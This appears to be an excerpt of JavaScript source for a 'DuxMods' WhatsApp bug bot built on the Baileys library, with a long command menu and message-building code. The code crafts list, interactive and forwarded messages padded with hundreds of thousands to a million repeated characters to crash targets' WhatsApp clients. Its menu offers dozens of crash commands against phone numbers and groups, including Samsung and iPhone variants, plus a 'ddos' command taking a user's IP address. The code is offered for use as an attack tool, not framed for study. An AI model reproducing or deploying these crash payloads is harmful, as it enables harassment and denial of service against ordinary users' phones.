...
if (isCmd) {
console.log(chalk.white.bgRed.bold('🔥 Ada pesan, Om'), color(`[ dux SCRIPT ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}
...
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "DuxModsBugCrash"+" ".repeat(920000),
...
☘︎☘︎───ꕥ *Your status* ꕥ────
☯︎➪   Name : ${pushname}
☯︎➪   Number: ${m.sender.split('@')[0]}
☯︎➪   Status: ${isPremium ? "Premium" : "Free"}
☯︎➪   Libary: Baileys - Socket
☯︎➪   Runtime : ${run}
└──ꕥ

☘︎☘︎❑ 「 *BUG EXTERNAL* 」 ❑──
☯︎➪   ${prefix}duxkil 234xxx
☯︎➪   ${prefix}systemuicrash 234xxx, amount
☯︎➪   ${prefix}doublekil 234xxx
☯︎➪   ${prefix}triplekill 234xxxx
☯︎➪   ${prefix}dux-list 234xxx|amount
☯︎➪   ${prefix}notif-ui 234xxx
☯︎➪   ${prefix}notir-crash 234xxx
☯︎➪   ${prefix}crash-total 234xxx
☯︎➪   ${prefix}duxbug 234xxx
☯︎➪   ${prefix}dux-bug 234xxx
☯︎➪   ${prefix}chace-bug 234xxx
☯︎➪   ${prefix}dux-crash 234xxx
☯︎➪   ${prefix}duxreact <reply message>
╰❑

☘︎☘︎❑ 「 *BUG INTERNAL* 」 ❑──
☯︎➪   ${prefix}internal-crash 234xxx, amount
☯︎➪   ${prefix}internal-ui 234xxx, amount
☯︎➪   ${prefix}crash-myinter 234xxx, amount
☯︎➪   ${prefix}dux-internal 234xxx, amount
☯︎➪   ${prefix}dux-external 234xxx, amount
☯︎➪   ${prefix}en-crash 234xxx, amount
☯︎➪   ${prefix}en-internal 234xxx, amount
☯︎➪   ${prefix}en-external 234xxx, amount
☯︎➪   ${prefix}en-ui 234xxx, amount
☯︎➪   ${prefix}bug-en 234xxx, amount
☯︎➪   ${prefix}bug-quoted 234xxx
☯︎➪   ${prefix}internal-quoted 234xxx
☯︎➪   ${prefix}external-quoted 234xxx
╰❑

☘︎☘︎❑ 「 *INTERNAL GROUP BUG* 」 ❑──
☯︎➪   ${prefix}bug-button link group
☯︎➪   ${prefix}bug-sitexyz link group
☯︎➪   ${prefix}button-internal link group
☯︎➪   ${prefix}button-external link group
☯︎➪   ${prefix}ui-grup link group
☯︎➪   ${prefix}bug-hole 120###@g.us
☯︎➪   ${prefix}enemygroup 120###@g.us
☯︎➪   ${prefix}internal-group 120###@g.us
☯︎➪   ${prefix}external-group 120###@g.us
╰❑
...
☘︎☘︎❑ 「 *Bug Jids* 」 ❑──
☯︎➪   ${prefix}jids-toui 234xxx, amount
☯︎➪   ${prefix}jids-en 234xxx, amount
☯︎➪   ${prefix}jids-internal 234xxx, amount
☯︎➪   ${prefix}jids-external 234xxx, amount
☯︎➪   ${prefix}jids-system 234xxx, amount
☯︎➪   ${prefix}jids-lol 234xxx, amount
☯︎➪   ${prefix}jids-unexpected 234xxx, amount
╰❑

☘︎☘︎❑ 「 *Bug Cringe* 」 ❑──
☯︎➪   ${prefix}cringe 234xxx
☯︎➪   ${prefix}kekuatanhitam 234xxx
☯︎➪   ${prefix}jomok 234xxx
☯︎➪   ${prefix}goyang 234xxx
☯︎➪   ${prefix}jomokblank 234xxx
☯︎➪   ${prefix}mampuslu 234xxx
╰❑

☘︎☘︎❑ 「 *Bug Blank* 」 ❑──
☯︎➪   ${prefix}blank 234xxx, amount
☯︎➪   ${prefix}blank-ui 234xxx, amount
☯︎➪   ${prefix}blank-dark, amount
☯︎➪   ${prefix}eror-bug, amount
☯︎➪   ${prefix}spesial-bug 234xxx, amount
☯︎➪   ${prefix}anything-crash 234xxx, amount
╰❑

☘︎☘︎❑ 「 *Bug Samsung* 」 ❑──
☯︎➪   ${prefix}samsung-bug 234xxx
☯︎➪   ${prefix}samsung-ui 234xxx
☯︎➪   ${prefix}samsung-internal 234xxx
☯︎➪   ${prefix}samsung-external 234xxx
☯︎➪   ${prefix}samsung-reboot 234xxx
☯︎➪   ${prefix}samsung-crash 234xxx
╰❑

☘︎☘︎❑ 「 *Bug List V1.1* 」 ❑──
☯︎➪   ${prefix}bug-list 234xxx, amount
☯︎➪   ${prefix}buglist-ui 234xxx, amount
☯︎➪   ${prefix}buglist-crash
☯︎➪   ${prefix}buglist-external
☯︎➪   ${prefix}buglist-internal
☯︎➪   ${prefix}buglist-en
╰❑

☘︎☘︎❑ 「 *Bug SUPER VIP* 」 ❑──
☯︎➪   ${prefix}bugvip 234xxx <rawan banned>
╰❑


☘︎☘︎❑ 「 *Iphone Bug* 」 ❑──
☯︎➪   ${prefix}ios-ui 234xxx
☯︎➪   ${prefix}ios-unlimitedj 234xxx
☯︎➪   ${prefix}ios-infinity 234xxx|timer
☯︎➪   ${prefix}ios-uicrash 234xxx|timer
╰❑
...
☯︎➪   ${prefix}self
☯︎➪   ${prefix}public
☯︎➪   ${prefix}addprem 62xx
☯︎➪   ${prefix}delprem 62xx
☯︎➪   ${prefix}boton 
╰❑

☘︎☘︎❑ 「 *Main Menu* 」 ❑──
☯︎➪   ${prefix}tiktok <link>
☯︎➪   ${prefix}database <cek user in website>
☯︎➪   ${prefix}ddos <ip addres user>
☯︎➪   ${prefix}cleardb <clear database website bot>
☯︎➪   ${prefix}cekip <ip information user, from web>
☯︎➪   ${prefix}hidetag <text>
☯︎➪   ${prefix}hdvideo <reply/image>
☯︎➪   ${prefix}blacklist <user ip>
☯︎➪   ${prefix}unblacklist <last ip user>
☯︎➪   ${prefix}enc <code js nya>
☯︎➪   ${prefix}loginweb <login website bot>
☯︎➪   ${prefix}logout <logout website bot>
╰❑

  *© Thanks To DuxMods for create this script*`
...
break
//=================================================//
case 'duxkil': case 'doublekil': case '💀': case 'triplekill': {
...
await VarelTzy.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `By DuxMods`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
...
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 2349167632397|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 2349167632397|1`)
let target = bijipler+"@s.whatsapp.net"
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻duxS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
